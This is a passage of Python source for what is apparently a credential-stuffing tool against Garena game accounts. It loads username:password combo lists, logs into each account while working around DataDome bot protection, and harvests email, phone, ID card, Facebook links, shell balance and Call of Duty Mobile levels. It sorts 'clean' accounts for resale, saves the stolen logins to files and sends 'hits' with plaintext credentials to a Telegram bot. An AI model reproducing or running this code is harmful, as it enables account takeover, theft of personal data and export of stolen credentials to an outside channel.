            "100067": "FREE FIRE",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100105": "GARENA UNDAWN",
            "100050": "ROV",
            "100151": "DELTA FORCE",
            "100147": "FAST THRILL",
            "100107": "MOONLIGHT BLADE"
        },
        'th': {
            "100067": "FREEFIRE",
            "100055": "ROV",
            "100082": "CODM",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100130": "BLACK CLOVER M",
            "100070": "SPEED DRIFTERS",
            "32836": "FC ONLINE",
            "100071": "FC ONLINE M",
            "100124": "MOONLIGHT BLADE"
        },
        'vn': {
            "32837": "FC ONLINE",
            "100072": "FC ONLINE M",
            "100054": "ROV",
            "100137": "THE WORLD OF WAR"
        },
        'default': {
            "100082": "CODM",
            "100067": "FREEFIRE",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100057": "AOV",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100055": "ROV"
        }
    }

    try:
        logger.info(f"[𝙄𝙉𝙁𝙊] CHECKING GAME CONNECTIONS for {account}...")
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"

        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
        try:
            token_json = token_response.json()
            access_token = token_json.get("access_token", "")
        except Exception:
            logger.error(f"[ERROR] Invalid JSON response from token grant for {account}")
            return []

        if not access_token:
            logger.warning(f"[WARNING] No access token for {account}")
            return []

        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }
        inspect_data = {"token": access_token}

        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=30)
        session_key_roles = inspect_response.cookies.get('session_key')
        if not session_key_roles:
            logger.warning(f"[WARNING] No session_key in response cookies for {account}")
            return []

        try:
            inspect_json = inspect_response.json()
        except Exception:
            logger.error(f"[ERROR] Invalid JSON response from token inspect for {account}")
            return []

        uac = inspect_json.get("uac", "ph").lower()
        region = uac if uac in valid_regions else 'ph'
        logger.info(f"[REGION] {region.upper()}")

        
        if region == 'th' or region == 'in':
            base_domain = "termgame.com"
        elif region == 'id':
            base_domain = "kiosgamer.co.id"
        elif region == 'vn':
            base_domain = "napthe.vn"
        else:
            base_domain = f"shop.garena.{region}"

        applicable_games = game_mappings.get(region, game_mappings['default'])

        for app_id, game_name in applicable_games.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            params_roles = {'app_id': app_id}
            headers_roles = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                'Accept': "application/json, text/plain, */*",
                'Referer': f"https://{base_domain}/?app={app_id}",
                'Cookie': f"session_key={session_key_roles}"
            }
            try:
                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=30)
                try:
                    roles_data = roles_response.json()
                except Exception:
                    
                    continue

                role = None
                
                if isinstance(roles_data.get("role"), list) and roles_data["role"]:
                    role = roles_data["role"][0]
                elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                   
                    candidate = roles_data[app_id][0]
                    if isinstance(candidate, dict):
                        role = candidate.get("role") or candidate.get("user_id") or None
                    else:
                        role = str(candidate)
                elif isinstance(roles_data, list) and roles_data:
                    
                    first = roles_data[0]
                    if isinstance(first, dict) and first.get("role"):
                        role = first.get("role")

                if role:
                    
                    role_str = str(role)
                    game_info.append({'region': region.upper(), 'game': game_name, 'role': role_str})
                    logger.info(f"[FOUND] {game_name} - {role_str} for {account}")
                else:
                    logger.debug(f"[NOT FOUND] {game_name} for {account}")

            except Exception as e:
                logger.warning(f"[WARNING] Error checking game {game_name} for {account}: {e}")
                continue

    except Exception as e:
        logger.error(f"[ERROR] Error getting game connections for {account}: {e}")

    return game_info

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            logger.warning(f"⚠️ No CODM access token for {account}")
            return has_codm, codm_info
        
        codm_token, status = process_codm_callback(session, access_token)
        
        if status == "no_codm":
            logger.info(f"⚠️ No CODM detected for {account}")
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            logger.warning(f"⚠️ CODM callback failed for {account}: {status}")
            return has_codm, codm_info
        
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            logger.info(f"✅ CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
            
    except Exception as e:
        logger.error(f"❌ Error checking CODM for {account}: {e}")
    
    return has_codm, codm_info

def display_error(error_type, login, password=None):
    login_line = f"𝗟𝗢𝗚𝗜𝗡: {login}"
    if password:
        login_line += f":{password}"

    line = "──────────────────────────────────────────────────────────────"

    error_map = {
        "error_auth": "𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗!",
        "error_no_account": "𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗢𝗘𝗦 𝗡𝗢𝗧 𝗘𝗫𝗜𝗦𝗧!",
        "error_security_ban": "𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗕𝗔𝗡!",
        "unknown_error": "𝗨𝗡𝗞𝗡𝗢𝗪𝗡 𝗘𝗥𝗥𝗢𝗥 𝗢𝗖𝗖𝗨𝗥𝗥𝗘𝗗!",
        "ip_blocked": "𝗜𝗣 𝗕𝗟𝗢𝗖𝗞𝗘𝗗! 𝗡𝗲𝘄 𝗗𝗮𝘁𝗮𝗗𝗼𝗺𝗲 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱",
        "prelogin_failed": "𝗣𝗥𝗘𝗟𝗢𝗚𝗜𝗡 𝗙𝗔𝗜𝗟𝗘𝗗!",
        "login_failed": "𝗟𝗢𝗚𝗜𝗡 𝗙𝗔𝗜𝗟𝗘𝗗!",
        "processing_error": "𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗘𝗥𝗥𝗢𝗥!"
    }

    reason = error_map.get(error_type, "𝗨𝗡𝗞𝗡𝗢𝗪𝗡 𝗘𝗥𝗥𝗢𝗥 𝗧𝗬𝗣𝗘!")

    return (
        f"{line}\n"
        f"❌ 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗖𝗵𝗲𝗰𝗸 𝗙𝗮𝗶𝗹𝗲𝗱\n"
        f"{login_line}\n"
        f"    -> {reason}\n"
        f"{line}"
    )



def display_codm_info(account_details, codm_info, password=None):

    # If no data at all
    if not codm_info and not account_details.get("game_info"):
        return ""

    # Fallback protection
    if isinstance(account_details, str):
        account_details = {
            'username': account_details,
            'nickname': 'N/A',
            'email': account_details,
            'personal': {
                'mobile_no': 'N/A',
                'country': 'N/A',
                'id_card': 'N/A'
            },
            'bind_status': 'N/A',
            'security_status': 'N/A',
            'profile': {'shell_balance': 'N/A'},
            'status': {'account_status': 'N/A'},
            'game_info': [],
            'security': {
                'facebook_connected': False,
                'facebook_account': None
            }
        }

    # LOGIN LINE
    login_line = f"𝗟𝗢𝗚𝗜𝗡: {account_details.get('username', 'N/A')}"
    if password:
        login_line += f":{password}"

    text = f"{login_line}\n"

    # BASIC DETAILS
    text += (
        f"    ➤ 𝗚𝗔𝗥𝗘𝗡𝗔 𝗦𝗛𝗘𝗟𝗟: {account_details['profile'].get('shell_balance', 'N/A')}\n"
        f"    ➤ 𝗘𝗠𝗔𝗜𝗟: {account_details.get('email', 'N/A')}\n"
        f"    ➤ 𝗠𝗢𝗕𝗜𝗟𝗘: {account_details['personal'].get('mobile_no', 'N/A')}\n"
        f"    ➤ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {account_details['personal'].get('country', 'N/A')}\n"
        f"    ➤ 𝗡𝗜𝗖𝗞𝗡𝗔𝗠𝗘: {account_details.get('nickname', 'N/A')}\n"
        f"    ➤ 𝗕𝗜𝗡𝗗 𝗦𝗧𝗔𝗧𝗨𝗦: {account_details.get('bind_status', 'N/A')}\n"
        f"    ➤ 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗦𝗧𝗔𝗧𝗨𝗦: {account_details.get('security_status', 'N/A')}\n"
        f"    ➤ 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗦𝗧𝗔𝗧𝗨𝗦: {account_details['status'].get('account_status', 'N/A')}\n"
    )

    # FACEBOOK INFO
    facebook_connected = account_details['security'].get('facebook_connected', False)
    facebook_account = account_details['security'].get('facebook_account', 'N/A')
    text += f"    ➤ 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗: {'Yes' if facebook_connected else 'No'}\n"
    if facebook_connected:
        text += f"    ➤ 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗔𝗖𝗖𝗢𝗨𝗡𝗧: {facebook_account}\n"

    # CODM INFO
    if codm_info:
        text += (
            f"    ➤ 𝗖𝗢𝗗𝗠 𝗜𝗡𝗙𝗢:\n"
            f"        - Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
            f"        - Level: {codm_info.get('codm_level', 'N/A')}\n"
            f"        - Region: {codm_info.get('region', 'N/A')}\n"
            f"        - UID: {codm_info.get('uid', 'N/A')}\n"
        )

    # GAME CONNECTIONS (CLEAN + COMPACT)
    game_list = account_details.get("game_info", [])
    if game_list:
        compact = ", ".join(
            f"{g.get('game', 'Unknown').upper()}({g.get('role', 'N/A')})"
            for g in game_list
        )
        text += f"    ➤ 𝗚𝗔𝗠𝗘 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡𝗦: {compact}\n"
    else:
        text += "    ➤ 𝗚𝗔𝗠𝗘 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡𝗦: None\n"

    text += "\nChecked By @LEGIThea"
    return text

def save_codm_account(account, password, codm_info, country='N/A'):
    try:
        if not codm_info:
            return
            
        codm_level = int(codm_info.get('codm_level', 0))
        region = codm_info.get('region', 'N/A').upper()
        nickname = codm_info.get('codm_nickname', 'N/A')
        
        if isinstance(country, dict):
            country_code = country.get('country', 'N/A').upper() if country.get('country') else region
        else:
            country_code = country.upper() if country and country != 'N/A' else region
            
        if country_code == 'N/A':
            country_code = 'UNKNOWN'

        if codm_level <= 50:
            level_range = "1-50"
        elif codm_level <= 100:
            level_range = "51-100"
        elif codm_level <= 150:
            level_range = "101-150"
        elif codm_level <= 200:
            level_range = "151-200"
        elif codm_level <= 250:
            level_range = "201-250"
        elif codm_level <= 300:
            level_range = "251-300"
        elif codm_level <= 350:
            level_range = "301-350"
        else:
            level_range = "351-400"

        os.makedirs('Country And Level Range', exist_ok=True)
        level_file = os.path.join('Country And Level Range', f"{country_code}_{level_range}_accounts.txt")
        
        account_exists = False
        if os.path.exists(level_file):
            with open(level_file, "r", encoding="utf-8") as f:
                existing_content = f.read()
                if account in existing_content:
                    account_exists = True
        
        if not account_exists:
            with open(level_file, "a", encoding="utf-8") as f:
                if account and password:
                    f.write(f"{account}:{password} | Level: {codm_level} | Nickname: {nickname} | Region: {region} | UID: {codm_info.get('uid', 'N/A')}\n")
                    logger.info(f"[SUCCESS] Saved CODM account: {account} (Level {codm_level})")
                else:
                    logger.info(f"[INFO] Skipping CODM save for {account}: missing account or password")
        else:
            logger.info(f"[INFO] CODM account {account} already exists in {level_file}, skipping duplicate\n")
            
    except Exception as e:
        logger.error(f"[ERROR] Error saving CODM account {account}: {e}")


import os
import logging

# Global counter for numbering accounts
full_counter = 1

def save_account_details(account, details, codm_info=None, password=None):
    global full_counter
    try:
        has_codm = codm_info is not None
        has_game_info = bool(details.get("game_info"))

        if not has_codm and not has_game_info:
            details['is_valid'] = False
            return

        os.makedirs('Results', exist_ok=True)

        # Extract CODM info safely
        codm_name = codm_info.get('codm_nickname', 'N/A') if has_codm else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if has_codm else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if has_codm else 'N/A'
        codm_level = codm_info.get('codm_level', 0) if has_codm else 0

        shell_balance = details['profile'].get('shell_balance', 0)
        country = details['personal'].get('country', 'N/A')
        bind_details = details.get('bind_status', 'N/A')

        fb_connected = details["security"].get("facebook_connected", False)
        fb_account = details["security"].get("facebook_account", "N/A")

        # Save CODM-only file if a save_codm_account function exists
        if has_codm and "save_codm_account" in globals():
            save_codm_account(account, password, codm_info, country)

        # Helper to determine level range
        def get_level_range(level):
            ranges = [(1,50), (51,100), (101,150), (151,200), (201,250),
                      (251,300), (301,350), (351,400)]
            for r in ranges:
                if r[0] <= level <= r[1]:
                    return f"Level_{r[0]}-{r[1]}.txt"
            return "Level_Unknown.txt"

        # Decide target folder
        if not has_codm and has_game_info:
            target_folder = os.path.join('Results', 'GameOnly', country)
            folder_status = ''
        else:
            folder_status = 'Clean' if details.get('is_clean', False) else 'NotClean'
            target_folder = os.path.join('Results', folder_status, country)

        os.makedirs(target_folder, exist_ok=True)

        # Determine main filename
        filename = os.path.join(target_folder, get_level_range(codm_level) if has_codm else "game_only_accounts.txt")

        # Shell folder for accounts with shell > 0
        if shell_balance > 0:
            shell_folder = os.path.join('Results', 'Shell', folder_status, get_level_range(codm_level).replace(".txt",""))
            os.makedirs(shell_folder, exist_ok=True)
            shell_file = os.path.join(shell_folder, f"{account}.txt")
        else:
            shell_file = None

        # Function to write details
        def write_details(file_path, counter=None):
            global full_counter
            if counter is None:
                counter = full_counter
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{counter}\n\n\n")
                if counter == full_counter:
                    full_counter += 1

                f.write(f"Account: {account}\n")
                if password:
                    f.write(f"Login: {account}:{password}\n")
                f.write(f"UID: {details.get('uid', 'N/A')}\n")
                f.write(f"Username: {details.get('username', 'N/A')}\n")
                f.write(f"Nickname: {details.get('nickname', 'N/A')}\n")
                f.write(f"Email: {details.get('email', 'N/A')}\n")
                f.write(f"Phone: {details['personal'].get('mobile_no', 'N/A')}\n")
                f.write(f"Country: {country}\n")
                f.write(f"Shell Balance: {shell_balance}\n")
                f.write(f"Account Status: {details['status'].get('account_status', 'N/A')}\n")
                f.write(f"Bind Status: {bind_details}\n")
                f.write(f"Security Status: {details.get('security_status', 'N/A')}\n")
                f.write(f"Facebook Connected: {'Yes' if fb_connected else 'No'}\n")
                if fb_connected:
                    f.write(f"Facebook Account: {fb_account}\n")
                f.write(f"CODM Name: {codm_name}\n")
                f.write(f"CODM UID: {codm_uid}\n")
                f.write(f"CODM Region: {codm_region}\n")
                f.write(f"CODM Level: {codm_level}\n")
                if has_game_info:
                    f.write("Game Connections:\n")
                    for g in details["game_info"]:
                        f.write(f"    - {g.get('game','Unknown')}: {g.get('role','Unknown')} ({g.get('region','N/A')})\n")
                f.write("\n\n\n")  # 3 blank lines

        # Write main file
        write_details(filename)
        # Write shell file if applicable
        if shell_file:
            write_details(shell_file)
        # Write full details
        write_details(os.path.join('Results','full_details.txt'))

    except Exception as e:
        logging.error(f"[ERROR] Error saving account details: {e}")

def parse_account_details(data):
    user_info = data.get('user_info', {})

    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),

        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },

        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },

        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },

        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },

        'binds': [],
        'game_info': []
    }

    # Collect binds
    email = account_info['email']
    if email != 'N/A' and email and not email.startswith('*') and '@' in email and not email.endswith('@gmail.com') and '**' not in email:
        account_info['binds'].append('Email')

    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')

    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')

    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')

    # Update bind status
    account_info['bind_status'] = "Clean" if len(account_info['binds']) == 0 and not account_info['email_verified'] else f"Bound ({', '.join(account_info['binds'])})"

    # Updated logic: email verified → NotClean / Bound; email not verified → Clean if no other binds
    account_info['is_clean'] = len(account_info['binds']) == 0 and not account_info['email_verified']

    # Security indicators
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("[WARNING] Suspicious")

    account_info['security_status'] = "[SUCCESS] Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, TG_SETTINGS=None):
    try:
        # ------------------- DATADOME HANDLING -------------------
        datadome_manager.clear_session_datadome(session)
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            datadome_manager.set_session_datadome(session, current_datadome)
        else:
            datadome = get_datadome_cookie(session)
            if datadome:
                datadome_manager.set_datadome(datadome)
                datadome_manager.set_session_datadome(session, datadome)

        # ------------------- LOGIN PREP -------------------
        v1, v2, new_datadome = prelogin(session, account, datadome_manager)
        if v1 == "IP_BLOCKED":
            live_stats.update_stats(valid=False)
            return display_error("ip_blocked", account, password)
        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return display_error("prelogin_failed", account, password)
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)

        # ------------------- LOGIN -------------------
        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return display_error("login_failed", account, password)

        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        cookies = session.cookies.get_dict()
        cookie_parts = [f"{k}={v}" for k, v in cookies.items() if k in ['apple_state_key', 'datadome', 'sso_key']]
        if cookie_parts:
            headers['cookie'] = '; '.join(cookie_parts)

        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        if response.status_code == 403:
            live_stats.update_stats(valid=False)
            return display_error("error_security_ban", account, password)

        try:
            account_data = response.json()
        except:
            live_stats.update_stats(valid=False)
            return display_error("unknown_error", account, password)

        if 'error' in account_data:
            live_stats.update_stats(valid=False)
            return display_error(account_data.get('error', 'unknown_error').lower(), account, password)

        # ------------------- PARSE ACCOUNT DETAILS -------------------
        details = parse_account_details(account_data if 'user_info' in account_data else {'user_info': account_data})

        # ------------------- CODM CHECK -------------------
        has_codm, codm_info = check_codm_account(session, account)

        # ------------------- GAME CONNECTIONS -------------------
        try:
            game_connections = get_game_connections(session, account)
        except Exception as e:
            logger.warning(f"[WARNING] Failed to fetch game connections for {account}: {e}")
            game_connections = []
        details["game_info"] = game_connections  

        # ------------------- SAVE COOKIES -------------------
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)

        save_account_details(account, details, codm_info if has_codm else None, password)

        live_stats.update_stats(valid=True, clean=details["is_clean"], has_codm=has_codm)

        result = f"[SUCCESS] {account}: Valid\n"
        result += display_codm_info(details, codm_info, password)

        # ------------------- TELEGRAM NOTIFICATION -------------------
        if TG_SETTINGS and has_codm and codm_info:
            try:
                codm_level = int(codm_info.get("codm_level", 0))
                clean_only = TG_SETTINGS.get("clean_only", False)
                level_range = TG_SETTINGS.get("level_range", "ALL")
                send_hit = True

                if clean_only and not details["is_clean"]:
                    logger.info(f"[SKIP] {account} (Bound, clean-only mode)")
                    send_hit = False

                if level_range != "ALL" and send_hit:
                    low, high = map(int, level_range.split("-"))
                    if not (low <= codm_level <= high):
                        logger.info(f"[SKIP] {account} (Level {codm_level} not in {level_range})")
                        send_hit = False

                if send_hit:
                    facebook_account = details['security'].get('facebook_account', 'Not Connected')
                    facebook_connected = details['security'].get('facebook_connected', False)
                    msg = (
                        f"[+] CODM Hit Found\n"
                        f"[+] Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
                        f"[+] Level: {codm_info.get('codm_level', 'N/A')}\n"
                        f"[+] Region: {codm_info.get('region', 'N/A')}\n"
                        f"[+] UID: {codm_info.get('uid', 'N/A')}\n"
                        f"[+] Login: {account}:{password}\n"
                        f"[+] Username: {account}\n"
                        f"[+] Email: {details.get('email', 'N/A')}\n"
                        f"[+] Country: {details.get('personal', {}).get('country', 'N/A')}\n"
                        f"[+] Bind Status: {'Clean' if details['is_clean'] else 'Bound'}\n"
                        f"[+] Facebook: {facebook_account if facebook_connected else 'Not Connected'}\n"
                        f"[+] Shell Balance: {details['profile'].get('shell_balance', '0')}\n"
                        f"[+] Security: Suspicious\n"
                        f"[+] Status: Active"
                    )
                    if details["game_info"]:
                        msg += "\n[+] Game Connections:\n"
                        for g in details["game_info"]:
                            msg += f"    - {g.get('game','Unknown')}: {g.get('role','Unknown')} ({g.get('region','N/A')})\n"

                    send_to_telegram(TG_SETTINGS['bot_token'], TG_SETTINGS['chat_id'], msg)
                    logger.info(f"[TG] Sent to Telegram: {account} (Level {codm_level})")

            except Exception as e:
                logger.error(f"[TG ERROR] Telegram send failed for {account}: {e}")

        return result

    except Exception as e:
        logger.error(f"[ERROR] Unexpected error processing {account}: {e}")
        live_stats.update_stats(valid=False)
        return display_error("processing_error", account, password)

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")

    txt_files = []
    for root, _, files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))

    for file_path in txt_files:
        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
            return file_path

    if txt_files:
        return random.choice(txt_files)

    return os.path.join(combo_folder, "accounts.txt")

import os
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import DOUBLE

console = Console()


def send_to_telegram(bot_token, chat_id, message):
    """Send message to Telegram bot with error handling"""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }

        response = requests.post(url, data=data, timeout=10)

        if response.status_code == 200:
            console.print(f"[green]✅ Telegram Hit Sent Successfully[/green]")
        else:
            console.print(Panel(
                f"⚠️ Telegram Error [{response.status_code}]\n\n{response.text}",
                style="red",
                title="Telegram Send Failed"
            ))

    except requests.exceptions.RequestException as e:
        console.print(Panel(
            f"❌ Network Error while sending to Telegram:\n{e}",
            style="red",
            title="Telegram Connection Error"
        ))



def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        unique_lines = []
        seen_lines = set()
        for line in lines:
            stripped_line = line.strip()
            if stripped_line and stripped_line not in seen_lines:
                unique_lines.append(line)
                seen_lines.add(stripped_line)

        if len(lines) == len(unique_lines):
            console.print(f"[yellow][*] No duplicate lines found in {os.path.basename(file_path)}.[/yellow]")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(unique_lines)

        console.print(f"[green][+] Removed {len(lines) - len(unique_lines)} duplicate lines from {os.path.basename(file_path)}.[/green]")
        return True
    except Exception as e:
        console.print(f"[red][ERROR] Failed to clean {os.path.basename(file_path)}: {e}[/red]")
        return False


import os
import cloudscraper
from rich.console import Console
from rich.panel import Panel
from rich.box import DOUBLE

console = Console()

def select_input_file():
    combo_folder = os.path.join(os.getcwd(), "Combo")
    os.makedirs(combo_folder, exist_ok=True)

    txt_files = [f for f in os.listdir(combo_folder) if f.endswith(".txt")]
    if not txt_files:
        console.print(Panel("No .txt files found in Combo folder!", style="red", title="Error"))
        exit(0)

    
    table = "\n".join([f"[cyan]{i+1}.[/cyan] {f}" for i, f in enumerate(txt_files)])
    console.print(Panel(table, title="Available Combo Files ───────────────[ꜱɴᴘ⛧ ᐯɪɴᴄᴇɴᴛ]", style="blue"))

    
    selected = console.input("\nSelect file number or press Enter for auto-select: ").strip()
    if selected.isdigit() and 1 <= int(selected) <= len(txt_files):
        file_path = os.path.join(combo_folder, txt_files[int(selected)-1])
    else:
        file_path = os.path.join(combo_folder, txt_files[0])
        console.print(Panel(f"Auto-selected: [green]{os.path.basename(file_path)}[/green]", style="green", title="Auto"))

    
    auto_remove_choice = console.input("\nAuto Remove Checked Lines (y/N): ").strip().lower()
    AUTO_REMOVE_CHECKED = auto_remove_choice == "y"

    
    tg_choice = console.input("\nSave TG Bot Hits (y/N): ").strip().lower()
    TG_SETTINGS = None

    if tg_choice == "y":
        TG_SETTINGS = {}
        TG_SETTINGS["bot_token"] = console.input("Enter BOT_TOKEN: ").strip()
        TG_SETTINGS["chat_id"] = console.input("Enter CHAT_ID: ").strip()

        clean_choice = console.input("Clean or NotClean [c/n]: ").strip().lower()
        TG_SETTINGS["clean_only"] = (clean_choice == "c")

        console.print("\nSelect Level Range to Send Hits:")
        console.print("[1] 1-50\n[2] 50-100\n[3] 100-200\n[4] 200-300\n[5] 300-400\n[6] ALL LEVELS")

        range_choice = console.input("Enter Number: ").strip()
        ranges = {
            "1": "1-50",
            "2": "50-100",
            "3": "100-200",
            "4": "200-300",
            "5": "300-400",
            "6": "ALL"
        }
        TG_SETTINGS["level_range"] = ranges.get(range_choice, "ALL")

        console.print(Panel(
            f"✅ Telegram Save Enabled\n"
            f"Bot Token: [cyan]{TG_SETTINGS['bot_token']}[/cyan]\n"
            f"Chat ID: [cyan]{TG_SETTINGS['chat_id']}[/cyan]\n"
            f"Clean Only: {'Yes' if TG_SETTINGS['clean_only'] else 'No'}\n"
            f"Level Range: {TG_SETTINGS['level_range']}",
            style="green",
            title="Telegram Save Setup ───────────────[ANTRAX]"
        ))

    return file_path, AUTO_REMOVE_CHECKED, TG_SETTINGS

import asyncio
import os
import cloudscraper
from rich.console import Console
from rich.panel import Panel
from rich.box import DOUBLE

console = Console()

def main():
    loop = asyncio.get_event_loop()

    filename, AUTO_REMOVE_CHECKED, TG_SETTINGS = select_input_file()

    if not os.path.exists(filename):
        console.print(Panel(f"File not found: {filename}", style="red", title="Error"))
        return

    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    session = cloudscraper.create_scraper()

    # -------------------------------------------
    # APPLY EXISTING OR FRESH COOKIE
    # -------------------------------------------
    initial_cookie = cookie_manager.get_valid_cookie()
    if initial_cookie:
        console.print(Panel("Using saved cookie", style="green", title="Session"))
        applyck(session, initial_cookie)
    else:
        console.print(Panel("Starting fresh session", style="yellow", title="Session"))
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)
            console.print(Panel("Generated DataDome cookie", style="green", title="Security"))
    # -------------------------------------------

    try:
        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
            accounts = [line.strip() for line in f if line.strip()]
    except Exception as e:
        console.print(Panel(f"Error reading file: {e}", style="red", title="File Error"))
        return

    total_accounts = len(accounts)
    console.print(Panel(
        f"Loaded [cyan]{total_accounts:,}[/cyan] accounts\nProcessing started...",
        style="bold blue",
        title="Processing Started ───────────────[ꜱɴᴘ⛧ ᐯɪɴᴄᴇɴᴛ]"
    ))

    # -------------------------------------------
    # PROCESS ACCOUNTS
    # -------------------------------------------
    for i, account_line in enumerate(accounts, 1):
        if ":" not in account_line:
            logger.warning(f"[SKIP] Invalid format: {account_line}")
            continue

        parts = account_line.split(":")
        if len(parts) == 2:
            account, password = parts
        elif len(parts) == 3:
            _, account, password = parts
        else:
            logger.warning(f"[SKIP] Invalid line format: {account_line}")
            continue

        account, password = account.strip(), password.strip()

        try:
            result = processaccount(
                session, account, password,
                cookie_manager, datadome_manager,
                live_stats, TG_SETTINGS
            )
            console.print(result)

            # Display live stats after each account
            stats = live_stats.get_stats()
            live_panel = Panel(
                f"Processing: [yellow]{i}/{total_accounts}[/yellow]\n"
                f"Valid: [green]{stats['valid']}[/green] | "
                f"Invalid: [red]{stats['invalid']}[/red] | "
                f"Clean: [blue]{stats['clean']}[/blue] | "
